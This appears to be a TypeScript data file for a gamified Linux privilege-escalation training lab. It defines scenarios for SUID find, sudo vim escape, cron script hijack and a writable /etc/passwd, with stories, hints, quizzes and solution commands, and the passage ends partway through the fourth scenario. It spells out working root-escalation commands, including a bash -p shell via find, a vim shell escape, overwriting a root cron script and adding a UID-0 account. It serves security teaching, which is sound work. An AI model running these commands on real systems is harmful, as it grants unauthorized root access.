import type { PrivescScenario } from './types';

export const PRIVESC_SCENARIOS: PrivescScenario[] = [
  {
    id: 'privesc-001',
    title: 'SUID Find',
    description:
      'You have a low-privilege shell on a Linux server. A routine audit reveals that common utilities may have been misconfigured. Explore the filesystem to find a way to escalate to root and capture the flag stored in /root/flag.txt.',
    technique: 'SUID Binary',
    difficulty: 'beginner',
    villain: {
      name: 'Dr. Elena Vasquez',
      alias: 'The Architect of Chaos',
      description: 'A rogue sysadmin who deliberately weakened server security to create backdoors for her hacking group.',
    },
    hints: [
      'Run: find / -perm -4000 -type f 2>/dev/null',
      'The find binary has the SUID bit set, it can execute commands as the file owner.',
      'GNU find supports the -exec flag. Combine it with /bin/bash to spawn a root shell.',
    ],
    story: {
      title: 'The SUID Breach: Valkyrie\'s Welcome',
      chapters: [
        {
          id: 'ch1-discovery',
          title: 'Chapter 1: Routine Reconnaissance',
          narrative: `> **Valkyrie:** "We have a low-privilege shell on this staging server. Before we do anything dangerous, let's map out our surroundings. Every good hack starts with recon."

Dr. Elena Vasquez: The Architect of Chaos, was NovaCorp's lead sysadmin. She deliberately weakened security to create backdoors for her hacking group. Let's trace her steps.

Start by listing files and checking where you are. The filesystem tells the story if you know how to read it. On any Linux host the first three commands are the same: \`id\` (who am I and what groups do I belong to), \`pwd\` (where am I), and \`ls -la\` (what is here). Privilege escalation almost always starts by discovering something the sysadmin left readable, writable, or executable that shouldn't be.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'command', value: 'pwd' }],
          hint: 'Start by exploring your surroundings with ls -la',
          quiz: [
            {
              id: 'ch1-discovery-q1',
              question: 'What is the primary reason privilege escalation often begins with reconnaissance commands like id, pwd, and ls -la?',
              options: [
                'They directly grant root privileges',
                'They reveal who you are, where you are, and what files are present, guiding where to look for misconfigurations',
                'They disable security logging on the host',
                'They automatically test the SUID bit on every binary',
              ],
              correctIndex: 1,
              explanation: 'Recon answers "who am I", "where am I", and "what is here" so you know what an attacker (or auditor) can already reach.',
            },
            {
              id: 'ch1-discovery-q2',
              question: 'Which kind of file does the chapter say privilege escalation "almost always starts" with discovering?',
              options: [
                'A file a sysadmin left readable, writable, or executable that should not be',
                'A new kernel version',
                'An encrypted password hash',
                'A signed certificate bundle',
              ],
              correctIndex: 0,
              explanation: 'Escalation begins by spotting something the sysadmin left readable, writable, or executable that should not be.',
            },
          ],
        },
        {
          id: 'ch2-finding',
          title: 'Chapter 2: The Rogue Binary',
          narrative: `> **Valkyrie:** "Good recon. Now let's dig deeper. The admin notes mention a tool called 'find' with SUID permissions."

**SUID (Set User ID)** is a special permission bit. When a binary has SUID set, it runs with the privileges of the **file owner** — not the user who executed it. That's why the standard \`passwd\` command can modify the root-owned shadow file: it runs as root even when a normal user invokes it.

Dr. Vasquez was clever, she used a legitimate tool as her backdoor. SUID binaries are dangerous when misconfigured, because they hand an unprivileged user a way to run code as root. If \`find\` has the SUID bit set and is owned by root, any command we pass to it, including one we choose, executes as root.

## Finding SUID Binaries

The command \`find / -perm -4000 -type f 2>/dev/null\` walks the entire filesystem and lists every file with mode 4000 (the SUID bit). In the results, SUID files show up with an \`s\` in the owner-execute position: \`-rwsr-xr-x\`. Spotting a **non-standard** binary like \`find\` in that list is a red flag the moment you see it.

## Why find Specifically?

GNU find supports the \`-exec\` flag, which runs an arbitrary command for each match. Combined with SUID, that means \`find\` becomes a root command launcher. That's the vulnerability.`,
          triggers: [{ type: 'command', value: 'find' }, { type: 'output_contains', value: '4755' }],
          hint: 'Search for SUID binaries: find / -perm -4000 -type f 2>/dev/null',
          quiz: [
            {
              id: 'ch2-finding-q1',
              question: 'What does the SUID (Set User ID) bit cause a binary to do when executed?',
              options: [
                'It runs with the privileges of the user who invoked it',
                'It runs with the privileges of the file owner, not the invoking user',
                'It always runs as the nobody user',
                'It requires a password before executing',
              ],
              correctIndex: 1,
              explanation: 'SUID makes a binary run with the file owner\'s privileges, which is why passwd can edit the root-owned shadow file.',
            },
            {
              id: 'ch2-finding-q2',
              question: 'Why does a GNU find binary with the SUID bit set represent a privilege escalation risk?',
              options: [
                'find can delete files it should not touch',
                'find supports the -exec flag, which can run an arbitrary command in place of its normal operation',
                'find always runs as root regardless of configuration',
                'find can mount filesystems by default',
              ],
              correctIndex: 1,
              explanation: 'GNU find\'s -exec flag turns a SUID find into a root command launcher.',
            },
          ],
        },
        {
          id: 'ch3-escalation',
          title: 'Chapter 3: Exploitation',
          narrative: `> **Valkyrie:** "Bingo! find has the SUID bit set (mode 4755). Here's the exploit chain:"

\`\`\`
find /tmp -exec /bin/bash -p \\;
\`\`\`

The \`find\` binary runs as root (because of SUID), so the \`-exec\` it performs executes as root too. We ask find to run \`/bin/bash -p\`, the \`-p\` flag tells bash to keep the privileged (root) UID instead of dropping it as it normally would. The result is an interactive root shell.

Dr. Vasquez thought she was clever with this backdoor. But we've turned her own weapon against her.

## Why -p Matters

Bash is designed to be safe: when it detects it's running with a real UID that differs from the effective UID (a classic SUID situation), it *drops* privileges unless invoked with \`-p\`. Without \`-p\`, the root shell quietly demotes itself back to our user. That flag is the difference between a root shell and a shell that looks like root but isn't.

## Next Step

Once you have the root shell, read the flag at \`/root/flag.txt\`, that's our objective complete."`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Use find with -exec to spawn a root shell: find /tmp -exec /bin/bash -p \\;',
          quiz: [
            {
              id: 'ch3-escalation-q1',
              question: 'Why is the -p flag necessary when spawning a root shell from a SUID binary via bash?',
              options: [
                'It speeds up the shell startup time',
                'It tells bash to keep the privileged (root) effective UID instead of dropping it, as bash normally would in a SUID situation',
                'It prevents the shell from logging commands',
                'It forces bash to read the /root/.bashrc file',
              ],
              correctIndex: 1,
              explanation: 'Bash drops privileges when real UID differs from effective UID unless invoked with -p.',
            },
            {
              id: 'ch3-escalation-q2',
              question: 'In the command `find /tmp -exec /bin/bash -p \\;`, why does the executed /bin/bash run as root?',
              options: [
                'Because find is owned by the current user',
                'Because /tmp is a root-owned directory',
                'Because find carries the SUID bit and runs as root, so the -exec it performs inherits that root privilege',
                'Because /bin/bash is always installed setuid root',
              ],
              correctIndex: 2,
              explanation: 'The SUID find runs as root, so the -exec command it performs also runs as root.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\napt:x:100:65534::/nonexistent:/usr/sbin/nologin\ntrainee:x:1000:1000:trainee:/home/trainee:/bin/bash',
      '/etc/shadow': 'root:$6$rounds=656000$redacted::0:99999:7:::',
      '/home/trainee/.bash_history': 'ls -la\nwhoami\nfind / -perm -4000 -type f 2>/dev/null',
      '/home/trainee/notes.txt':
        '# System Notes\n- The sysadmin installed find with SUID for recursive audits\n- /root/flag.txt contains today\'s flag\n- Do NOT share root credentials',
      '/usr/bin/find': '[SUID binary, owned by root, mode 4755]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'find / -perm -4000 -type f 2>/dev/null',
      'find /tmp -exec /bin/bash -p \\;',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-002',
    title: 'Sudo Vim Escape',
    description:
      'You are logged in as the user "analyst". Running sudo -l reveals that your user can run vim as root without a password. Exploit this misconfiguration to read the root flag.',
    technique: 'Sudo Misconfiguration',
    difficulty: 'beginner',
    hints: [
      'Check your sudo permissions with: sudo -l',
      'Vim can execute shell commands when run with elevated privileges.',
      'From vim, run :!cat /root/flag.txt or :!bash to spawn a root shell.',
    ],
    story: {
      title: 'The Vim Trap: Breaking the Cage',
      chapters: [
        {
          id: 'ch1-permissions',
          title: 'Chapter 1: What Can I Do?',
          narrative: `You're logged in as 'analyst'. First rule of privesc: know your limits.

## Know What You Can Run as Root

The \`sudo -l\` command lists every command your user is allowed to run through sudo, along with any authentication requirements. The sudoers file controls all of this, it's the rulebook that says "who can run what, as whom, with or without a password."

If you can run ANY program as root without a password, that program becomes your escape hatch. Any binary you can invoke as root can: directly or indirectly, execute arbitrary commands with root privileges. The misconfiguration isn't always obvious: editors, pagers, and scripting interpreters are the classic culprits because they all have "run a shell command" features built in.`,
          triggers: [{ type: 'command', value: 'sudo -l' }],
          hint: 'Check sudo permissions with sudo -l',
          quiz: [
            {
              id: 'ch1-permissions-q1',
              question: 'What does `sudo -l` reveal to a user on a system?',
              options: [
                'The current user\'s password hashes',
                'Every command the user is allowed to run through sudo and the associated authentication requirements',
                'A list of all logged-in users',
                'The kernel version of the host',
              ],
              correctIndex: 1,
              explanation: 'sudo -l lists the commands your user may run via sudo, along with password requirements.',
            },
            {
              id: 'ch1-permissions-q2',
              question: 'Why are editors, pagers, and scripting interpreters dangerous to grant via sudo?',
              options: [
                'They consume excessive memory as root',
                'They all have built-in features to run shell commands, which inherit root privileges',
                'They cannot be closed without root',
                'They ignore the sudoers file entirely',
              ],
              correctIndex: 1,
              explanation: 'Programs like editors and pagers can execute arbitrary commands, an escape hatch when run as root.',
            },
          ],
        },
        {
          id: 'ch2-discovery',
          title: 'Chapter 2: The Vim Door',
          narrative: `> **Valkyrie:** "Excellent. The sudo rules say: analyst can run vim as root (NOPASSWD). This is a critical misconfiguration."

## Why vim Is Dangerous as Root

Vim is a text editor with a built-in shell escape. The \`:!\` command runs any shell command, and when vim itself is running as root, that shell command runs as root too. A "restricted" editor is therefore equivalent to a root shell with extra steps.

This is not unique to vim: \`nano\`, \`less\`, \`man\`, \`more\`, and \`awk\`/\`perl\`/\`python\` all have similar escape mechanisms. The security rule is absolute: never grant users sudo access to any program that can spawn a shell. The \`NOPASSWD\` part makes it worse, no password prompt means our escape is frictionless.

## The Exploit Path

\`sudo vim\` opens the editor as root. Inside vim, \`:!command\` executes \`command\` as root. That single feature turns a text editor into a privilege escalation primitive.`,
          triggers: [{ type: 'command', value: 'vim' }],
          hint: 'Run vim with sudo: sudo vim',
          quiz: [
            {
              id: 'ch2-discovery-q1',
              question: 'Which vim feature makes it equivalent to a root shell when run with sudo?',
              options: [
                'The :w (write) command',
                'The :! (bang) shell escape, which runs shell commands that inherit vim\'s root identity',
                'The insert mode',
                'The syntax highlighting engine',
              ],
              correctIndex: 1,
              explanation: 'The :! command executes shell commands, and they run as root when vim does.',
            },
            {
              id: 'ch2-discovery-q2',
              question: 'What makes the NOPASSWD entry in the sudoers file especially dangerous?',
              options: [
                'It disables all sudo logging',
                'It means no password prompt is required, so the exploit is frictionless',
                'It grants the user access to every binary on the system',
                'It automatically changes the user\'s UID to 0',
              ],
              correctIndex: 1,
              explanation: 'NOPASSWD removes the authentication step, making the sudo escape trivial to execute.',
            },
          ],
        },
        {
          id: 'ch3-escape',
          title: 'Chapter 3: Breaking Out',
          narrative: `> **Valkyrie:** "Vim is running with root privileges. Now break out of the cage."

## The Escape Sequence

1. Open vim with sudo: \`sudo vim\`, the editor now runs as root.
2. Enter command mode with \`:\`.
3. Run \`:!cat /root/flag.txt\`, executes as root, reading the flag directly.
4. Or go further with \`:!bash\`, spawns a full interactive root shell.

The \`:!\` prefix tells vim "run the following as a shell command." Since vim's effective UID is root, everything it spawns inherits root privileges.

## Think of vim as a Trojan Horse

It looks innocent, an editor. But it hides a root shell inside. In real engagements, every sudo entry in the sudoers file gets interrogated for exactly this kind of escape: can the allowed binary run a shell, read a file, or modify a script that runs as root? If yes, the "safe" sudo rule is a privilege escalation waiting to happen.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'From vim, run :!cat /root/flag.txt to read the flag',
          quiz: [
            {
              id: 'ch3-escape-q1',
              question: 'What is the sequence to break out of sudo vim and read a root-only file?',
              options: [
                'Enter command mode with : and run :!cat /root/flag.txt',
                'Press Esc then type :w! /root/flag.txt',
                'Type :e /root/flag.txt in insert mode',
                'Run :delete /root/flag.txt from the editor',
              ],
              correctIndex: 0,
              explanation: 'In command mode, :! runs a shell command, and it executes as root when vim is running as root.',
            },
            {
              id: 'ch3-escape-q2',
              question: 'From a security audit standpoint, what should be interrogated about every sudoers entry?',
              options: [
                'Whether the allowed binary can run a shell, read a file, or modify a script that runs as root',
                'How long the binary takes to load',
                'Which color scheme the binary uses',
                'Whether the binary is owned by the invoking user',
              ],
              correctIndex: 0,
              explanation: 'Any sudo entry that can spawn a shell or read/modify root files is a privilege escalation waiting to happen.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/sudoers':
        'root\tALL=(ALL:ALL) ALL\nanalyst\tALL=(root) NOPASSWD: /usr/bin/vim\n',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nanalyst:x:1001:1001::/home/analyst:/bin/bash',
      '/home/analyst/.bash_history': 'sudo vim /etc/nginx/nginx.conf',
      '/home/analyst/README.txt':
        '# Analyst Workstation\n- You have sudo access to vim for editing configs\n- Flag is in /root/flag.txt\n- Contact admin if you need additional access',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'sudo -l',
      'sudo vim -c ":!cat /root/flag.txt"',
    ],
  },
  {
    id: 'privesc-003',
    title: 'Cron Job Hijack',
    description:
      'A legacy server runs a cleanup script every minute via cron. The script is world-writable. Exploit this to escalate privileges and read the root flag.',
    technique: 'Cron Job Abuse',
    difficulty: 'intermediate',
    hints: [
      'Examine /etc/crontab and /etc/cron.d/ for scheduled tasks.',
      'The cleanup script at /opt/cleanup.sh is owned by root but writable by everyone.',
      'Overwrite the script with a reverse shell or a command that reads the flag, then wait for cron to execute it.',
    ],
    story: {
      title: 'The Silent Chronometer: Hijacking Time',
      chapters: [
        {
          id: 'ch1-recon',
          title: 'Chapter 1: Scheduled Tasks',
          narrative: `> **Valkyrie:** "This is an old legacy server. Cron jobs run tasks on schedules, often as root. Let's inspect the system scheduler."

## How Cron Works

Cron is the Linux task scheduler. The \`/etc/crontab\` file (and \`/etc/cron.d/\`, plus per-user crontabs) defines what runs and when. The killer detail: cron jobs frequently run as **root** because they were set up by administrators who needed the privileges, and nobody ever reviewed them again.

## Reading the Cron Format

\`cat /etc/crontab\` shows every scheduled task with its five time fields:

\`\`\`
* * * * *   root   command-to-run
┌───────── minute (0-59)
│ ┌─────── hour (0-23)
│ │ ┌───── day of month (1-31)
│ │ │ ┌─── month (1-12)
│ │ │ │ ┌─ day of week (0-7)
│ │ │ │ │
* * * * * command
\`\`\`

## Spotting the Vulnerability

The attack question is simple: **does any scheduled task run a script or binary that an unprivileged user can write to?** If a root cron job executes a world-writable script, we can replace that script with our own payload and wait, cron will run it as root for us. The scheduler does the privilege escalation; we just provide the content.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'crontab' }],
          hint: 'Check scheduled tasks: cat /etc/crontab',
          quiz: [
            {
              id: 'ch1-recon-q1',
              question: 'Why does a cron job running as root create a privilege escalation opportunity?',
              options: [
                'Cron jobs are always written in bash',
                'If a root cron job executes a world-writable script, we can replace that script with our own payload and cron runs it as root',
                'Cron runs every task twice',
                'Cron disables the SUID bit on scripts',
              ],
              correctIndex: 1,
              explanation: 'The scheduler performs the escalation by executing as root whatever content the world-writable script contains.',
            },
            {
              id: 'ch1-recon-q2',
              question: 'In the cron time format `* * * * *`, what does the first asterisk position represent?',
              options: [
                'Hour',
                'Minute',
                'Day of month',
                'Month',
              ],
              correctIndex: 1,
              explanation: 'The five fields are minute, hour, day of month, month, and day of week, so the first field is the minute.',
            },
          ],
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Writable Script',
          narrative: `> **Valkyrie:** "Found it! A cleanup script at /opt/cleanup.sh runs as root every minute, and it's world-writable."

## Why World-Writable Means Owned

\`ls -la /opt/cleanup.sh\` shows the real permissions. A script showing \`-rwxrwxrwx\` is writable by **everyone**, meaning any user can replace its contents. When cron executes it as root, cron runs *our* content as root. The script being owned by root doesn't help; what matters is who can write to it.

## Attack Plan

1. Overwrite \`/opt/cleanup.sh\` with our payload.
2. Payload: \`cat /root/flag.txt > /tmp/flag_output.txt\`, copies the flag to a file we can read.
3. Wait for cron to execute it as root (runs every minute).
4. Read the flag from the output file.

This works because the **execution identity** (root, from cron) and the **file ownership** (who wrote the content) are completely different things. The cron job trusts a script it doesn't control.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'cleanup' }],
          hint: 'Check script permissions: ls -la /opt/cleanup.sh',
          quiz: [
            {
              id: 'ch2-vulnerability-q1',
              question: 'Why does a script owned by root but world-writable (-rwxrwxrwx) represent a vulnerability?',
              options: [
                'Because anyone who can write to it can replace its contents, which cron then executes as root',
                'Because the SUID bit is set',
                'Because world-writable files are deleted every reboot',
                'Because ownership changes each time it runs',
              ],
              correctIndex: 0,
              explanation: 'What matters is who can write to the file, not who owns it; writing it replaces the content cron trusts.',
            },
            {
              id: 'ch2-vulnerability-q2',
              question: 'What executes the payload in a cron hijack, and why?',
              options: [
                'The current user, because cron drops privileges',
                'Cron, because cron jobs run with the privileges listed in the crontab entry, here root',
                'The owner of the script, regardless of the crontab',
                'An anonymous daemon with no privileges',
              ],
              correctIndex: 1,
              explanation: 'Cron executes the script with the privileges in the crontab entry, which in this case is root.',
            },
          ],
        },
        {
          id: 'ch3-exploitation',
          title: 'Chapter 3: Patience is a Virtue',
          narrative: `> **Valkyrie:** "Inject the payload into the cleanup script. We're planting a seed and waiting for the cron to water it."

## Writing the Payload

\`\`\`
echo '#!/bin/bash' > /opt/cleanup.sh
echo 'cat /root/flag.txt > /tmp/flag_output.txt' >> /opt/cleanup.sh
chmod +x /opt/cleanup.sh
\`\`\`

The first line makes it a valid bash script. The second line replaces the original cleanup logic with our exfiltration command, the flag's contents get copied to \`/tmp/flag_output.txt\`, which our low-privilege user CAN read. The \`chmod +x\` keeps it executable so cron runs it without complaint.

## Why Redirect to a Readable File

If we tried to \`cat /root/flag.txt\` directly in our shell, we'd get permission denied, root's home directory and the flag are mode 600/700, readable only by root. The trick is letting cron (running as root) do the reading and deposit the result somewhere our user can access. \`/tmp\` is world-readable, so once the flag lands there, it's ours.

## Timing

The cron job fires every 60 seconds, so the injection is a waiting game. One minute later, the flag appears.`,
          triggers: [{ type: 'command', value: 'echo' }, { type: 'command', value: 'chmod' }],
          hint: 'Overwrite the script: echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/flag_output.txt\' > /opt/cleanup.sh',
          quiz: [
            {
              id: 'ch3-exploitation-q1',
              question: 'Why redirect the flag\'s contents to a readable file like /tmp instead of reading /root/flag.txt directly?',
              options: [
                'Because /root is a restricted mount point',
                'Because the low-privilege user cannot read /root/flag.txt directly (mode 600/700), so we let the root cron read it and deposit the result somewhere readable',
                'Because /tmp is encrypted',
                'Because redirection is faster than cat',
              ],
              correctIndex: 1,
              explanation: 'The root cron does the privileged reading and writes the output to /tmp, which is world-readable.',
            },
            {
              id: 'ch3-exploitation-q2',
              question: 'Why must you run chmod +x on the overwritten cleanup script?',
              options: [
                'To make the file owned by root',
                'To keep it executable so cron runs it without complaint',
                'To set the SUID bit',
                'To hide the file from cron',
              ],
              correctIndex: 1,
              explanation: 'The script must remain executable or cron will refuse to run the replaced content.',
            },
          ],
        },
        {
          id: 'ch4-flag',
          title: 'Chapter 4: The Harvest',
          narrative: `> **Valkyrie:** "The cron job executed your script as root. The flag is now in the output file. Harvest it!"

## Harvest the Flag

\`cat /tmp/flag_output.txt\`, the flag lands in the file within one cron cycle.

## Why This Works (and Why It's Everywhere)

This is a classic **cron hijack**: the administrator trusted a script that anyone could modify. Cron executes with the privileges listed in the crontab entry, in this case root, so the trust is complete. The mistake is that the file's *write* permissions contradict the *execute* trust: root executes a script that ordinary users can edit.

In real pentests, this is one of the most common privesc vectors, and it generalizes: any root-scheduled script, service, or binary that a low-privilege user can modify is a privilege escalation, whether via cron, systemd timers, or init scripts.`,
          triggers: [{ type: 'file_access', value: '/home/dev/flag_output.txt' }],
          hint: 'After waiting a minute, check: cat /home/dev/flag_output.txt',
          quiz: [
            {
              id: 'ch4-flag-q1',
              question: 'What is the core mistake that makes a "cron hijack" possible?',
              options: [
                'Cron jobs run with random privileges',
                'An administrator trusted a script that any user could modify, so root executes content ordinary users can edit',
                'Cron stores passwords in plaintext',
                'Cron jobs cannot be paused',
              ],
              correctIndex: 1,
              explanation: 'The write permissions of the script contradict the execute trust, letting ordinary users control what root runs.',
            },
            {
              id: 'ch4-flag-q2',
              question: 'Which general class of systems is vulnerable to the pattern behind this attack?',
              options: [
                'Any root-scheduled script, service, or binary that a low-privilege user can modify',
                'Any file owned by root regardless of permissions',
                'Any kernel newer than 5.x',
                'Any directory with the sticky bit set',
              ],
              correctIndex: 0,
              explanation: 'The pattern generalizes to cron, systemd timers, and init scripts run as root from modifiable locations.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n* * * * * root\t/opt/cleanup.sh',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndev:x:1002:1002::/home/dev:/bin/bash',
      '/opt/cleanup.sh':
        '#!/bin/bash\n# Scheduled cleanup, runs every minute\n# Last modified by deploy bot 2025-11-03\nLOGDIR=/var/log/tmp\nmkdir -p $LOGDIR\nfind /tmp -type f -mtime +1 -delete\nfind /var/tmp -type f -mtime +1 -delete\necho "[$(date)] Cleanup complete" >> /var/log/cleanup.log',
      '/home/dev/notes.txt':
        '# Dev Notes\n- The cleanup script runs as root every minute\n- You can write to /opt/cleanup.sh\n- /root/flag.txt is the target\n- Make sure your payload writes to a location you can read',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /etc/crontab',
      'ls -la /opt/cleanup.sh',
      'echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/flag_output.txt\' > /opt/cleanup.sh',
      'chmod +x /opt/cleanup.sh',
      'sleep 65',
      'cat /home/dev/flag_output.txt',
    ],
  },
  {
    id: 'privesc-004',
    title: 'Writable passwd',
    description:
      'You discover that /etc/passwd is world-writable, a critical misconfiguration. Craft a password entry for a new user with root-level UID and escalate to root.',
    technique: 'Writable /etc/passwd',
    difficulty: 'intermediate',
    hints: [
      'Check file permissions: ls -la /etc/passwd',
      'You can add a new entry to /etc/passwd with UID 0, it will be treated as root.',
      'Generate a password hash with: openssl passwd -1 -salt abc newpass',
    ],
    story: {
      title: 'The Golden Key: Overwriting Identity',
      chapters: [
        {
          id: 'ch1-discovery',
          title: 'Chapter 1: Permissive Permissions',
          narrative: `> **Valkyrie:** "Let's check the permissions on /etc/passwd, the system's user database."

## Why /etc/passwd Permissions Matter

\`/etc/passwd\` is the system's user database. It should be owned by root and writable only by root. If it's **world-writable**, anyone can add a user, and that's a privilege escalation.

## The /etc/passwd Format

\`\`\`
username:password_hash:UID:GID:comment:home:shell
\`\`\`

The fields are: username, password hash (an \`x\` means "hash is in /etc/shadow"), **UID**, **GID**, comment, home directory, and login shell.

## The Critical Field: UID

The operating system doesn't track "who is admin" by name, it tracks the numeric **UID**. UID 0 is root. UID 1000+ is a regular user. If we add an entry with UID 0, the system treats that user as root for every permission check. The name in the first field is cosmetic; the UID is everything.

## Why the Hash Goes Here

On modern systems the hash normally lives in \`/etc/shadow\` (that's what the \`x\` means). But if we put a real hash directly in the \`/etc/passwd\` field, login will use it. We generate one with \`openssl passwd\` so we know the password.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'passwd' }],
          hint: 'Check permissions: ls -la /etc/passwd',
          quiz: [
            {
              id: 'ch1-discovery-q1',
              question: 'What is the critical field in /etc/passwd that the operating system uses to decide if a user is root?',
              options: [
                'The username in the first field',
                'The numeric UID (UID 0 is root)',
                'The comment field',
                'The login shell',
              ],
              correctIndex: 1,
              explanation: 'The system tracks permissions by numeric UID, so UID 0 is root regardless of the name.',
            },
            {
              id: 'ch1-discovery-q2',
              question: 'Why would an entry with UID 0 be treated as root even if the name looks like a normal user?',
              options: [
                'Because the system checks the name first',
                'Because every permission check uses the UID, not the cosmetic name',
                'Because UID is only cosmetic in Linux',
                'Because passwords are checked before UID',
              ],
              correctIndex: 1,
              explanation: 'The name is cosmetic; all permission decisions are based on the numeric UID.',
            },
          ],
        },
        {
          id: 'ch2-planning',
          title: 'Chapter 2: Crafting the Entry',
          narrative: `> **Valkyrie:** "The file is writable. Now we need a password hash for our new root user."

## Generating a Hash

\`\`\`
openssl passwd -1 -salt xyz newpass
\`\`\`

Output looks like: \`$1$xyz$<hash>\`

This produces an MD5-crypt hash (\`$1$\`) of the password \`newpass\` using the salt \`xyz\`.

## Why Salt?

A salt is random data mixed into the password before hashing. It ensures that two users with the same password get different hashes, and it defeats **rainbow tables**, precomputed password-to-hash lookup tables. If an attacker has the hash but not the salt, a rainbow table is useless because the salt changes the hash.

## Why We Care

Here we control both salt and password, so we're not cracking anything, we're *generating* a known hash for our malicious user entry. Any hash will do; what matters is that \`su pwned\` will prompt for a password and verify it against this hash. Since we chose \`newpass\`, we know the answer.`,
          triggers: [{ type: 'command', value: 'openssl' }, { type: 'output_contains', value: '$1$' }],
          hint: 'Generate password hash: openssl passwd -1 -salt xyz newpass',
          quiz: [
            {
              id: 'ch2-planning-q1',
              question: 'What purpose does a salt serve when hashing passwords?',
              options: [
                'It encrypts the password with a symmetric key',
                'It is random data mixed into the password so identical passwords produce different hashes and rainbow tables are defeated',
                'It shortens the resulting hash',
                'It grants root privileges',
              ],
              correctIndex: 1,
              explanation: 'Salts make identical passwords hash differently and render precomputed rainbow tables useless.',
            },
            {
              id: 'ch2-planning-q2',
              question: 'Why here do we generate a hash rather than try to crack one?',
              options: [
                'Because we control both salt and password, we are producing a known hash for our malicious user entry',
                'Because cracking requires a GPU cluster',
                'Because MD5 hashes cannot be cracked',
                'Because openssl only generates new hashes',
              ],
              correctIndex: 0,
              explanation: 'We choose the password and salt, so we generate a hash we know will authenticate with `su pwned`.',
            },
          ],
        },
        {
          id: 'ch3-injection',
          title: 'Chapter 3: The Injection',
          narrative: `> **Valkyrie:** "Time to inject. We're adding user 'pwned' with UID 0 (root) to /etc/passwd."

## The Injection

\`\`\`
echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd
\`\`\`

## Field-by-Field Breakdown

| Field | Value | Meaning |
|-------|-------|---------|
| pwned | username | our malicious account name |
| $1$xyz$<hash> | password hash | lets us authenticate as pwned |
| 0 | UID | **root**, the whole point |
| 0 | GID | root's primary group |
| (empty) | comment | unused field |
| /root | home dir | maps the user to root's home |
| /bin/bash | shell | interactive login shell |

## Why This Works

When \`su pwned\` runs, the login system reads this entry, sees UID 0, and grants root privileges after the password check succeeds. The append (\`>>\`) preserves all existing users while adding ours. The system has no idea "pwned" isn't a legitimate root account, by every permission check, it is one.`,
          triggers: [{ type: 'command', value: 'echo' }, { type: 'output_contains', value: '/etc/passwd' }],
          hint: 'Add user: echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd',
          quiz: [
            {
              id: 'ch3-injection-q1',
              question: 'What does the `>>` append operator ensure in the injection?',
              options: [
                'It overwrites the entire /etc/passwd file',
                'It appends the new entry while preserving all existing users',
                'It backs up the file first',
                'It requires sudo privileges',
              ],
              correctIndex: 1,
              explanation: 'Appending adds our entry to the end, leaving existing entries intact so the system still functions.',
            },
            {
              id: 'ch3-injection-q2',
              question: 'After login successfully verifies the hash, what privileges does `su pwned` grant?',
              options: [
                'The privileges of a normal user',
                'Root privileges, because the entry has UID 0',
                'The privileges of the user who ran su',
                'No privileges, since pwned is not a real account',
              ],
              correctIndex: 1,
              explanation: 'Because the injected entry has UID 0, the login system treats it as root after password verification.',
            },
          ],
        },
        {
          id: 'ch4-root',
          title: 'Chapter 4: Becoming Root',
          narrative: `> **Valkyrie:** "The trap is set. Switch to the 'pwned' user and claim your prize."

## Becoming Root

\`\`\`
su pwned
cat /root/flag.txt
\`\`\`

\`su\` (switch user) authenticates against the hash we placed in /etc/passwd, then starts a shell with the new user's UID: which is 0. We just turned a writable file into root access.

## Why /etc/passwd Permissions Are Sacred

This attack requires exactly one misconfiguration: the file being writable by non-root users. On any properly configured system, \`/etc/passwd\` is \`-rw-r--r--\` (only root can write) and the hashes live in \`/etc/shadow\`, which is root-only readable. File permission mistakes like this are why the /etc/passwd permissions are considered sacred, one chmod slip can hand an attacker a root account.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Switch user: su pwned, then cat /root/flag.txt',
          quiz: [
            {
              id: 'ch4-root-q1',
              question: 'On a properly configured system, why is this attack impossible?',
              options: [
                'Because /etc/passwd is mode -rw-r--r-- and hashes live in root-only-readable /etc/shadow',
                'Because usernames are validated against a registry',
                'Because UID 0 is reserved only for "root"',
                'Because /etc/passwd cannot be edited by anyone',
              ],
              correctIndex: 0,
              explanation: 'Proper configuration makes /etc/passwd read-only for non-root and keeps hashes in /etc/shadow.',
            },
            {
              id: 'ch4-root-q2',
              question: 'What single misconfiguration is required for this attack to succeed?',
              options: [
                'A weak root password',
                'The /etc/passwd file being writable by non-root users',
                'The presence of openssl on the system',
                'An NFS share being mounted',
              ],
              correctIndex: 1,
              explanation: 'Everything hinges on /etc/passwd being writable by non-root users; that one chmod slip is the vulnerability.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
